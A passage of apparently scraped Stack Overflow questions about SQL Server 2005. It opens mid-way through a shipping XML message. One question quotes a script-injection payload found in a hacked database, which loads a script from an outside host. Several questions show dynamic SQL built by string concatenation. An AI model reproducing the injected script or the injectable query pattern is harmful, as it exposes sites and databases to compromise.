&lt;ssdh:Sender&gt;\n          &lt;upi:PartnerIdentification&gt;\n            &lt;upi:PartnerName&gt;CISCO&lt;/upi:PartnerName&gt;\n            &lt;DUNS xmlns=\"urn:rosettanet:specification:universal:DataType:xsd:schema:01.04\"&gt;678543210&lt;/DUNS&gt;\n          &lt;/upi:PartnerIdentification&gt;\n        &lt;/ssdh:Sender&gt;\n      &lt;/ssdh:DocumentHeader&gt;\n      &lt;tns:ShippingBusinessDocument&gt;\n        &lt;dat:ActionType&gt;ADD&lt;/dat:ActionType&gt;\n        &lt;tns:HeaderInformation&gt;\n          &lt;tns:PackingList&gt;\n            &lt;udc:DateTime&gt;2012-03-01T00:39:54-07:00&lt;/udc:DateTime&gt;\n            &lt;udct:DocumentType&gt;SHD&lt;/udct:DocumentType&gt;\n            &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n            &lt;udc:Line&gt;0&lt;/udc:Line&gt;\n            &lt;udc:Revision&gt;F&lt;/udc:Revision&gt;\n          &lt;/tns:PackingList&gt;\n          &lt;tns:ShippingDocument&gt;\n            &lt;udc:DateTime&gt;2012-03-01T00:39:54-07:00&lt;/udc:DateTime&gt;\n            &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n            &lt;udc:Identifier&gt;51548069&lt;/udc:Identifier&gt;\n            &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n            &lt;udc:Revision&gt;Standard - JPN&lt;/udc:Revision&gt;\n          &lt;/tns:ShippingDocument&gt;\n          &lt;tns:ShippingOrderInformation&gt;\n            &lt;dl:OrderInformation&gt;\n              &lt;ulc:AlternativeIdentifier&gt;\n                &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                &lt;ulc:Identifier /&gt;\n              &lt;/ulc:AlternativeIdentifier&gt;\n              &lt;dl:OrderAllocationDate&gt;2012-03-16T00:00:00-07:00&lt;/dl:OrderAllocationDate&gt;\n              &lt;dl:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;PUO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;X9055411-K2501&lt;/udc:Identifier&gt;\n              &lt;/dl:OrderReference&gt;\n              &lt;dl:TotalAmount&gt;\n                &lt;ume:Amount&gt;6422.09&lt;/ume:Amount&gt;\n                &lt;ucr:Currency&gt;USD&lt;/ucr:Currency&gt;\n              &lt;/dl:TotalAmount&gt;\n            &lt;/dl:OrderInformation&gt;\n            &lt;tns:RequestingOrderInformation&gt;\n              &lt;udc:BusinessDocumentReference&gt;\n                &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;51548069-1&lt;/udc:Identifier&gt;\n              &lt;/udc:BusinessDocumentReference&gt;\n              &lt;tns:IsOrderToBeMerged&gt;0&lt;/tns:IsOrderToBeMerged&gt;\n              &lt;tns:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;SNC&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n                &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n                &lt;udc:Revision&gt;1&lt;/udc:Revision&gt;\n                &lt;udc:SubLine&gt;1&lt;/udc:SubLine&gt;\n              &lt;/tns:OrderReference&gt;\n            &lt;/tns:RequestingOrderInformation&gt;\n            &lt;tns:RequestingOrderInformation&gt;\n              &lt;udc:BusinessDocumentReference&gt;\n                &lt;udct:DocumentType&gt;SAO&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;51548069-1&lt;/udc:Identifier&gt;\n              &lt;/udc:BusinessDocumentReference&gt;\n              &lt;tns:IsOrderToBeMerged&gt;0&lt;/tns:IsOrderToBeMerged&gt;\n              &lt;tns:OrderReference&gt;\n                &lt;udc:DateTime&gt;2012-05-08T05:12:57-07:00&lt;/udc:DateTime&gt;\n                &lt;udct:DocumentType&gt;SNC&lt;/udct:DocumentType&gt;\n                &lt;udc:Identifier&gt;0&lt;/udc:Identifier&gt;\n                &lt;udc:Line&gt;1&lt;/udc:Line&gt;\n                &lt;udc:Revision&gt;1&lt;/udc:Revision&gt;\n                &lt;udc:SubLine&gt;2&lt;/udc:SubLine&gt;\n              &lt;/tns:OrderReference&gt;\n            &lt;/tns:RequestingOrderInformation&gt;\n          &lt;/tns:ShippingOrderInformation&gt;\n        &lt;/tns:HeaderInformation&gt;\n        &lt;tns:ShipmentInformation&gt;\n          &lt;tns:ContainerTotalCount&gt;1&lt;/tns:ContainerTotalCount&gt;\n          &lt;dl:CustomsInformation&gt;\n            &lt;dl:Customs&gt;\n              &lt;uc:Country&gt;US&lt;/uc:Country&gt;\n              &lt;dcst:CustomsType&gt;EXP&lt;/dcst:CustomsType&gt;\n              &lt;dl:EntryNumber&gt;77-0059951&lt;/dl:EntryNumber&gt;\n              &lt;dl:Identifier /&gt;\n            &lt;/dl:Customs&gt;\n          &lt;/dl:CustomsInformation&gt;\n          &lt;tns:DeclarationInformation&gt;\n            &lt;tns:Declarant&gt;\n              &lt;upi:SpecifiedFullPartner schemaVersion=\"this choice is requried\" /&gt;\n            &lt;/tns:Declarant&gt;\n            &lt;tns:IsInformationComplete&gt;1&lt;/tns:IsInformationComplete&gt;\n            &lt;upi:PartnerDescription&gt;\n              &lt;upi:FullPartner&gt;\n                &lt;uci:ContactInformation&gt;\n                  &lt;uci:Contact /&gt;\n                  &lt;uci:Phone /&gt;\n                &lt;/uci:ContactInformation&gt;\n                &lt;ulc:Location&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;CCI+CI+PL+PL2+SLI&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/ulc:Location&gt;\n                &lt;upi:PartnerIdentification&gt;\n                  &lt;upi:PartnerName&gt;CISCO SYSTEMS G.K.&lt;/upi:PartnerName&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;68268&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/upi:PartnerIdentification&gt;\n                &lt;ulc:PhysicalAddress&gt;\n                  &lt;ulc:AddressLine1&gt;Midtown Tower&lt;/ulc:AddressLine1&gt;\n                  &lt;ulc:AddressLine2&gt;9-7-1, Akasaka&lt;/ulc:AddressLine2&gt;\n                  &lt;ulc:AddressLine3&gt;Minato-ku&lt;/ulc:AddressLine3&gt;\n                  &lt;ulc:AddressLine4 /&gt;\n                  &lt;ulc:AddressLine5 /&gt;\n                  &lt;ulc:CityName&gt;Tokyo, 107-6227&lt;/ulc:CityName&gt;\n                  &lt;uc:Country&gt;JP&lt;/uc:Country&gt;\n                  &lt;ucs:CountrySubdivision /&gt;\n                  &lt;ulc:PostalCode /&gt;\n                  &lt;ulc:PostOfficeBox /&gt;\n                &lt;/ulc:PhysicalAddress&gt;\n                &lt;upri:ProcessRoleIdentifier&gt;IMB&lt;/upri:ProcessRoleIdentifier&gt;\n              &lt;/upi:FullPartner&gt;\n            &lt;/upi:PartnerDescription&gt;\n            &lt;upi:PartnerDescription&gt;\n              &lt;upi:FullPartner&gt;\n                &lt;uci:ContactInformation&gt;\n                  &lt;uci:Contact&gt;None&lt;/uci:Contact&gt;\n                  &lt;uci:Phone /&gt;\n                &lt;/uci:ContactInformation&gt;\n                &lt;ulc:Location&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier&gt;CCI+CI+PL+PL2+SLI&lt;/ulc:Identifier&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/ulc:Location&gt;\n                &lt;upi:PartnerIdentification&gt;\n                  &lt;upi:PartnerName&gt;CISCO SYSTEMS G.K.&lt;/upi:PartnerName&gt;\n                  &lt;ulc:AlternativeIdentifier&gt;\n                    &lt;ulc:Authority&gt;Cisco Systems&lt;/ulc:Authority&gt;\n                    &lt;ulc:Identifier /&gt;\n                  &lt;/ulc:AlternativeIdentifier&gt;\n                &lt;/upi:PartnerIdentification&gt;\n                &lt;ulc:PhysicalAddress&gt;\n                  &lt;ulc:AddressLine1&gt;C/o Schenker Logistics&lt;/ulc:AddressLine1&gt;\n                  &lt;ulc:AddressLine2&gt;MIDTOWN TOWER&lt;/ulc:AddressLine2&gt;\n                  &lt;ulc:AddressLine3&gt;9-7-1, AKASAKA&lt;/ulc:AddressLine3&gt;\n                  &lt;ulc:AddressLine4 /&gt;\n                  &lt;ulc:AddressLine5 /&gt;\n                  &lt;ulc:CityName&gt;MINATO-KU&lt;/ulc:CityName&gt;\n                  &lt;uc:Country&gt;JP&lt;/uc:Country&gt;\n                  &lt;ucs:CountrySubdivision&gt;TOKYO&lt;/ucs:CountrySubdivision&gt;\n                  &lt;ulc:PostalCode&gt;107-6227&lt;/ulc:PostalCode&gt;\n                  &lt;ulc:PostOfficeBox /&gt;\n                &lt;/ulc:PhysicalAddress&gt;\n                &lt;upri:ProcessRoleIdentifier&gt;ITT&lt;/upri:ProcessRoleIdentifier&gt;\n              &lt;/upi:FullPartner&gt;\n            &lt;/upi:PartnerDescription&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","replace","html-entities"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":11959566,"title":"How can I convert all HTML Entities and unicode chars to english equivalents for sorting in SQL?","body":"<p>I have database data that has special characters in both unicode and html entity format in the data. I need to sort the list of results alphabetically however, some of the unicode data and html entities mess up the alphabetical order (ie: &amp;# comes before A when the code might be for an accented E which comes after A). </p>\n\n<p>Currently, I'm just using a nested replace statement to generate a 'sort' column since I was under the impression there was a limited set of special characters used in the DB. </p>\n\n<p>The client wants to be on the safe side and convert ALL characters on this page <a href=\"http://webdesign.about.com/library/bl_htmlcodes.htm\" rel=\"nofollow\">http://webdesign.about.com/library/bl_htmlcodes.htm</a> into english equivalents before sorting... </p>\n\n<p>Current code:</p>\n\n<pre><code>Replace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(\nReplace(@Word, 'À', 'A') \n             , 'Â', 'A')\n             , 'Ä', 'A')\n             , 'Ç', 'C')\n             , 'É', 'E')\n             , 'È', 'E')\n             , 'È', 'E')\n             , 'Ê', 'E')\n             , 'Î', 'I')\n             , 'ï', 'i')\n             , '&amp;#216;', 'O')\n             , '&amp;#336;', 'o')\n             , '&amp;#193;', 'A')\n             , '&amp;#209;', 'N')\n             , '&amp;#237;', 'I')\n             , '&amp;#211;', 'O')\n             , '&amp;#323;', 'N')\n             , '&amp;#268;', 'C')\n             , '&amp;#225;', 'A')\n             , '&amp;#337;', 'O')\n             , 'ő', 'o')\n             , 'ö', 'o')\n</code></pre>\n\n<p>I realize this code is terribly inefficient - it started with only a couple of characters and then was added to over time. </p>\n\n<p>What would be the best way to cycle through all the combinations on the page linked above? </p>\n\n<p>Better yet, can someone confirm if the unicode values are sorted properly alphabetically and if so, is there a pre-built SQL Server 2005 function to just convert HTML Entities (friendly, numerical and hex versions) to Unicode for this column? </p>\n\n<p>Thanks,</p>\n\n<p>Thomas</p>\n"},{"tags":["sql","sql-server","string","sql-server-2005","split"],"answer_count":10,"favorite_count":21,"up_vote_count":84,"down_vote_count":0,"view_count":149266,"score":84,"question_id":2647,"title":"Split string in SQL","body":"<p>Using SQL Server 2005, how do I split a string so I can access item x?</p>\n\n<p>For example, take the string \"Hello John Smith\". How can I split the string by a space and access the item at index 1 which should return \"John\"?</p>\n"},{"tags":["c#","sql-server-2005","import-from-excel"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1009,"score":1,"question_id":11954296,"title":"Could not load file or assembly 'Microsoft.Office.Interop.Excel, Version=12.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'","body":"<p>When I am adding foll. code but on server its showing error.\nCode - </p>\n\n<pre><code> object oMissing = System.Reflection.Missing.Value;\n                        Microsoft.Office.Interop.Excel.ApplicationClass xl = new Microsoft.Office.Interop.Excel.ApplicationClass();\n                        Microsoft.Office.Interop.Excel.Workbook xlBook;\n                        Microsoft.Office.Interop.Excel.Worksheet xlSheet;\n                        xlBook = (Workbook)xl.Workbooks.Open(docPath, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing, oMissing);\n                        xlSheet = (Worksheet)xlBook.Worksheets.get_Item(1);\n                        xlSheet.Name = \"Sheet1\";\n                        xlBook.Save();\n                        xl.Application.Workbooks.Close();\n</code></pre>\n\n<p>Error - </p>\n\n<pre><code>System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Office.Interop.Excel, Version=12.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c' or one of its dependencies. The system cannot find the file specified.\n</code></pre>\n\n<p>I have added reference of \"Microsoft.Office.Interop.Excel\" dll in webApplication.\nIn local its working fine. \nNote : In server microsoft Office is not installed.\nCan any one solve this issue without any installation on server.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":11485,"score":3,"question_id":803386,"title":"Easy way to import/export Sql Server 2005 users/permissions across instances?","body":"<p>Is there an easy way to export and then import users/permissions from one Sql Server 2005 instance to another?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":305,"score":1,"question_id":11951135,"title":"SQL Selecting distinct rows from multiple columns based on max value in one column","body":"<p>This is my SQL View - lets call it MyView :</p>\n\n<pre>\nECode   SHCode  TotalNrShare    CountryCode Country\n000001  +00010  100 UKI United Kingdom\n000001  ABENSO  900 USA United States\n000355  +00012  1000    ESP Spain\n000355  000010  50  FRA France\n000042  009999  10  GER Germany\n000042  +00012  999 ESP Spain\n000787  ABENSO  500 USA United States\n000787  000150  500 ITA Italy\n001010  009999  100 GER Germany\n</pre>\n\n<p>I would like to return the single row with the highest number in the column TotalNrShare for each ECode.</p>\n\n<p>For example, I’d like to return these results from the above view:</p>\n\n<pre>\nECode   SHCode  TotalNrShare    CountryCode Country\n000001  ABENSO  900 USA United States\n000355  +00012  1000    ESP Spain\n000042  +00012  999 ESP Spain\n000787  ABENSO  500 USA United States\n001010  009999  100 GER Germany\n</pre>\n\n<p>(note in the case of ECode 000787 where there are two SHCode's with 500 each, as they are the same amount we can just return the first row rather than both, it isnt important for me which row is returned since this will happen very rarely and my analysis doesnt need to be 100%)</p>\n\n<p>Ive tried various things but do not seem to be able to return either unqiue results or the additional country code/country info that I need.</p>\n\n<p>This is one of my attempts (based on other solutions on this site, but I am doing something wrong):</p>\n\n<pre><code>SELECT tsh.ECode, tsh.SHCode, tsh.TotalNrShare, tsh.CountryCode, tsh.Country\nFROM  dbo.MyView AS tsh INNER JOIN\n                   (SELECT DISTINCT ECode, MAX(TotalNrShare) AS MaxTotalSH\n                    FROM   dbo.MyView\n                    GROUP BY ECode) AS groupedtsh ON tsh.ECode = groupedtsh.ECode AND tsh.TotalNrShare = groupedtsh.MaxTotalSH\n</code></pre>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1397,"score":2,"question_id":663124,"title":"What is the SQL Server CLR Integration Life Cycle?","body":"<p>How are CLR (.NET) objects managed in SQL Server? </p>\n\n<p>The entry point to any CLR code from SQL Server is a static method. Typically you'll only create objects that exist within the scope of that method. However, you could conceivably store references to objects in static members, letting them escape the method call scope. If SQL Server retains these objects in memory across multiple stored procedure/function calls, then they could be useful for caching applications -- although they'd be more dangerous too.</p>\n\n<p>How does SQL Server treat this? Does it even allow (non-method) static members? If so, how long does it retain them in memory? Does it garbage collect everything after every CLR call? How does it handle concurrency?</p>\n"},{"tags":["sql-server","database","sql-server-2005","autoincrement"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":7328,"score":2,"question_id":958120,"title":"How can I make a primary key as AUTOINCREMENT","body":"<p>I have table in Database and the primry key is 'ID', Just I want to ask how can I make it AUTOINCREMENT</p>\n\n<p>I know that's esay Q, but I dont know how can I do it.</p>\n\n<p>thanks</p>\n"},{"tags":["sql-server","sql-server-2005","sql-injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":238,"score":0,"question_id":11748600,"title":"SQL Injection in my database","body":"<p>Is it possible to write a query that goes through the entire database to search out a particular phrase to delete it, instead of going table by table? This is on a SQL Server 2008 Database that was injected. The following appears throughout the database tables:</p>\n\n<pre><code>\"&gt;&lt;/title&gt;&lt;script src=\"http://lasimp04risoned.rr.nu/sl.php\"&gt;&lt;/script&gt;&lt;!--\n</code></pre>\n\n<p>This appears all over in different tables exactly as above. So my database is currently limping. Can anyone help me?</p>\n\n<p>Thanks</p>\n\n<p>Daniel</p>\n"},{"tags":["query","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":11943597,"title":"Unclosed quotation","body":"<p>I am trying to pull the selected values from my checkboxlist but I keep running into an error in sql.</p>\n\n<p>error</p>\n\n<pre><code>Msg 105, Level 15, State 1, Line 22\nUnclosed quotation mark after the character string ')'.\nMsg 102, Level 15, State 1, Line 22\nIncorrect syntax near ')'.\n</code></pre>\n\n<p>SP</p>\n\n<pre><code>@DEPTCODE INT,\n@COA VARCHAR(50),\n@MAP VARCHAR(10)\nAS\nBEGIN\nSET NOCOUNT ON;\nDECLARE @SQL VARCHAR(MAX);\n\nBEGIN\nSET @SQL = N'SELECT \n              A.GL_EXCEPT_ID AS ''GL ID''\n            , A.COA_SYSTEM AS ''Account Type''\n            , A.ENTN AS ''Entity''\n            , A.MED_CTR AS ''Medical Center''\n            , (''['' + A.LOCN + ''] '' + B.LOCN_DESC) AS ''Location Code''\n            , (''['' + A.CTRN + ''] '' + C.CTRN_DESC) AS ''Cost Center''\n            , (''['' + RTRIM(A.FUND) + ''] '' + A.FUND_DESC) AS ''Fund''\n            , A.ROLLUP_TYPE_ID AS ''Rollup ID''\n            , A.ROLLUP_TYPE_DESC AS ''Rollup Type''\n            , A.MAPPING AS ''Mapping''\nFROM V_ROLLUP_GL_DESC_REV1 A\n    LEFT JOIN T_ROLLUP_GL_LOCN B\n        ON A.LOCN = B.LOCN\n            AND A.MED_CTR_ID = B.MED_CTR_ID\n            AND A.COA_SYSTEM = B.COA_SYSTEM\n    LEFT JOIN T_ROLLUP_GL_CTRN C\n        ON A.CTRN = C.CTRN\n            AND A.COA_SYSTEM = C.COA_SYSTEM\nWHERE (A.DEPT_ID = '+CONVERT(VARCHAR,@DEPTCODE)+')\n        AND A.COA_SYSTEM IN ('+@COA+')\n        AND A.MAPPING IN ('+@MAP+''')'\nPRINT(@SQL)\nEXEC(@SQL)\nEND\nEND\n</code></pre>\n\n<p>Query</p>\n\n<pre><code>USE [Rollup2]\nGO\n\nDECLARE @return_value int\n\nEXEC    @return_value = [dbo].[USP_GET_GL_BY_DEPT]\n    @DEPTCODE = 1000,\n    @COA = N'''COA'',''COA_SYSTEM''',\n    @MAP = N'''DEFAULT'',''EXCEPTION'''\n\nSELECT  'Return Value' = @return_value\n</code></pre>\n"},{"tags":["sql","sql-server-2005","query"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":5353516,"title":"SQL Server - update on-the-fly added column","body":"<p>I used the following command to add a new column initialized with \"100\" to the result of SELECT </p>\n\n<pre><code>select id, 100 as newcol from table\n</code></pre>\n\n<p>How to update newcol values? for example I want to set newcol = 200 where id = 1</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":195,"score":2,"question_id":5728031,"title":"SQL Server 2005 Single Quoted list of strings fail","body":"<p>I have an SP that has an <code>nvarchar(max)</code> parameter <code>@p1</code>. This is a comma separated list of codes e.g. <code>100,200,300</code> etc</p>\n\n<p>Inside the SP I declare a variable <code>@p2 nvarchar(max)</code> and convert the <code>@p1</code> list into a single quoted list</p>\n\n<pre><code>set @p2 = N'''' + replace(@p1,',',''',''') + ''''\n</code></pre>\n\n<p>When I \"select\" <code>@p2</code> this returns the correct <code>'100', '200', '300'</code></p>\n\n<p>If I then use <code>@p2</code> in a subselect, e.g</p>\n\n<pre><code>select x,y,z from table1 where id in (@p2) \n</code></pre>\n\n<p>I get no rows returned? If I modify the same SQL to use the same string literal I got from the previous select I get the rows ok? </p>\n\n<p>How can I pass a string containing a list of single quoted identifiers to a SP and use this in a subselect? I've Googled this extensively, and it is possible to convert the list to a temporary table inside the SP and use this, but I need to use the quoted list so I can use an OPTIMIZE FOR query hint.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":11940034,"title":"Conversion Failing","body":"<p>I currently have an update statement running in c# and the front end to edit some values in my sql server database.  But I am getting a Conversion Failed error.  I can not seem to find the source.</p>\n\n<p>ERROR message</p>\n\n<pre><code>Conversion failed when converting the nvarchar value 'UPDATE T_ROLLUP_SYSTEM_EXCEPT\n            SET DEPT_ID = ' to data type int.\n14\n</code></pre>\n\n<p>Sql</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[USP_UPDATE_SYS_MAPPING]\n-- Add the parameters for the stored procedure here\n@SYSTEM VARCHAR(50),\n@UNIT VARCHAR(50),\n@MEDCTRLEVEL VARCHAR(50),\n@MEDCTR VARCHAR(50),\n@FACID VARCHAR(50),\n@ENTN VARCHAR(50),\n@DEPT_ID INT,\n@ROLLUP_TYPE_ID INT\nAS\nBEGIN\n-- SET NOCOUNT ON added to prevent extra result sets from\n-- interfering with SELECT statements.\nSET NOCOUNT ON;\nDECLARE @SQL VARCHAR(MAX);\nDECLARE @MEDCTRID INT;\n\nSELECT @MEDCTRID = MED_CTR_ID FROM T_ROLLUP_MED_CTR WHERE MED_CTR = @MEDCTR\nPRINT (@MEDCTRID);\n\n-- Insert statements for procedure here\nSET @SQL = N'UPDATE T_ROLLUP_SYSTEM_EXCEPT\n            SET DEPT_ID = \n                '''+@DEPT_ID'''                 , ROLLUP_TYPE_ID = '''+@ROLLUP_TYPE_ID+'''\n                , UPDATE_DT = GETDATE()\n            WHERE SYSTEM = '''+@SYSTEM+'''\n                AND ENTN = '''+@ENTN+'''\n                AND MED_CTR_ID = '+CONVERT(VARCHAR,@MEDCTRID)+'\n                AND MED_CTR_LEVEL = '''+@MEDCTRLEVEL+'''\n                AND FAC_ID = '''+@FACID+'''\n                AND UNIT = '''+@UNIT+''''\nPRINT (@SQL);\nEXEC (@SQL);\n</code></pre>\n\n<p>HTML</p>\n\n<pre><code>            string[] mdctrvalue = medctr.Text.Split('[', ']');\n            string[] mpvalue = mpSearch.Text.Split('(', ')');\n\n            string sys = acctsys.ToString();\n            string unit = txtunit.ToString();\n            string mdctrlvl = mdctrvalue[1].ToString();\n            string mdctr = mdctrvalue[0].ToString();\n            string facid = fac.ToString();\n            string entn = txtentn.ToString();\n            string dept_id = dept.SelectedValue.ToString();\n            string rollup_type_id = rolluptype.SelectedValue.ToString();\n\n            SqlConnection myconn = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings[\"Rollup2ConnectionString\"].ConnectionString);\n            SqlCommand cmd = new SqlCommand();\n            cmd.Connection = myconn;\n            cmd.CommandType = CommandType.StoredProcedure;\n            cmd.CommandText = \"USP_UPDATE_SYS_MAPPING\";\n            cmd.Parameters.Add(\"@SYSTEM\", SqlDbType.VarChar).Value = acctsys.ToString();\n            cmd.Parameters.Add(\"@UNIT\", SqlDbType.VarChar).Value = unit.ToString();\n            cmd.Parameters.Add(\"@MEDCTRLEVEL\", SqlDbType.VarChar).Value = mdctrlvl.ToString();\n            cmd.Parameters.Add(\"@MEDCTR\", SqlDbType.VarChar).Value = mdctr.ToString();\n            cmd.Parameters.Add(\"@FACID\", SqlDbType.VarChar).Value = facid.ToString();\n            cmd.Parameters.Add(\"@ENTN\", SqlDbType.VarChar).Value = entn.ToString();\n            cmd.Parameters.Add(\"@DEPT_ID\", SqlDbType.Int).Value = dept_id.ToString();\n            cmd.Parameters.Add(\"@ROLLUP_TYPE_ID\", SqlDbType.Int).Value = rollup_type_id.ToString();\n\n            myconn.Open();\n            int retVal = cmd.ExecuteNonQuery();\n</code></pre>\n"},{"tags":["sql","vb.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":113,"score":-4,"question_id":11935847,"title":"convert marks into percentage","body":"<p>how to convert marks obtained by a student into x% \ni.e. there are two exams. calculate certain %marks from both exams (say x% and Y%) so that the total will be 100%</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11882039,"title":"combining resultset of many select queries","body":"<p>I have four Select queries for four different tables, each extracting only one record. For example:</p>\n\n<pre><code>Select * from table where col1 = 'something'\n</code></pre>\n\n<p>gives one row having 3 columns.</p>\n\n<p>The second select query also gives one record having two columns(fields). Same for third and fourth select query.</p>\n\n<p>I want to combine all four result sets into one having one row. How is it possible?</p>\n\n<p>I will write the queries for you.</p>\n\n<p>1st one:</p>\n\n<pre><code>Select Top 1 column1, column2\nfrom table 1\nwhere column 1 = 'something'\n  and col1 = (Select max(col1) where column 1 = 'something')\n</code></pre>\n\n<p>2nd query:</p>\n\n<pre><code>Select Top 1 column1, column3\nfrom table 2\nwhere column 1 = 'something'\n  and column3 = (Select max(column3) where column 1 = 'something')   \n</code></pre>\n\n<p>3rd query uses the result obtained from query 2:</p>\n\n<pre><code>Select column4\nfrom table 3\nwhere column3 = (obtained from 2nd query)  (there is only one row)\n</code></pre>\n\n<p>4th:</p>\n\n<pre><code>Select column5\nfrom table 4\nwhere column3 = (obtained from 2nd query) (there is only one row)\n</code></pre>\n\n<p>This means I have to join 2nd, 3rd, 4th query, then resulting set in 1st.</p>\n\n<p>I can't use union since columns are different.</p>\n\n<p>So only problem is with joining the result set.</p>\n"},{"tags":["delphi","sql-server-2005","sql-server-2000","tadodataset"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":173,"score":2,"question_id":11913549,"title":"How to detect any modification that happens in SQL Server database?","body":"<p>I have an application using <code>TADODataSet</code> and <code>TADOConnection</code> to connect with SQL Server database.</p>\n\n<p>I would like to detect any modification that happens in the database. </p>\n\n<p>modifications = Insert, Update, Delete</p>\n\n<p>I want to know which <code>TADODataset</code> or which table has been modified.</p>\n\n<p>I'm doing this because I have a multi-user application that works over local network. The users may add, delete or edit records in tables so I want to refresh the datasets to show the new modifications.</p>\n\n<p>Also I want this to build a log.</p>\n\n<p>I don't want to use <code>TTime</code> to keep watching the modifications.<br>\nI don't want to use triggers</p>\n\n<p>I prefer a message from <code>TADOConnection</code>.</p>\n\n<p>I'm using SQL Server 2005 and Delphi 2007 with ADO components.</p>\n\n<p>New modification : I need it on SQL Server 2000</p>\n\n<p>Regards.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":11901353,"title":"How to include empty string in a like query in sql server","body":"<p>This seems an easy thing but somehow I'm not able to think of it.</p>\n\n<p>I want to write a like query in this format:</p>\n\n<pre><code>WHERE Searchfield LIKE '[ ;]Mark'\n</code></pre>\n\n<p>Now this would check for an occurence of</p>\n\n<pre><code>' Mark', ';Mark'\n</code></pre>\n\n<p>I want it to be able to search the following string as well:</p>\n\n<pre><code>'Mark'\n</code></pre>\n\n<p>How do I indicate that it can have the occurrence of a space, or a semicolon or no character.</p>\n"},{"tags":["sql","sql-server-2005","sp-send-dbmail"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":9996605,"title":"Streaming htm file with an image into sp_send_dbmail","body":"<p>I have a stored procedure the runs sp_makewebtask to create a .HTM file.  Thie file consists of an image and the output of a query along with some addtional verbage. What I would like to do is to send out that .HTM file using sp_send_dbmail. I know I can bypass the sp_makewebtask step and dynamically create the .HTM file but I am hoping to avoid this. Any ideas? Thanks </p>\n\n<p>EXEC msdb.dbo.sp_send_dbmail @recipients='John.Testing@companyX.COM',<br>\n    @subject = 'My Mail Test',<br>\n    @body = @Var1, --Basically I want to know how I can replace the @Var1 with the dynamically created .HTM file<br>\n    @body_format = 'HTML'     </p>\n"},{"tags":["c#",".net","windows","sql-server-2005","deployment"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":279,"score":0,"question_id":11913195,"title":"Setup of C# 3.5 window application with database SQL Server 2005","body":"<p>As I am very new in this technology, and I have made a windows application in C# .NET 3.5 with SQL Server 2005. I also made the setup from Visual Studio 2008 wizard, but I cannot configure the server name (such as Amit/SQLEXPRESS). Is there any way to make the setup that automatically configure the server name when I install the setup onto client system?</p>\n\n<p>Please send me the step by step 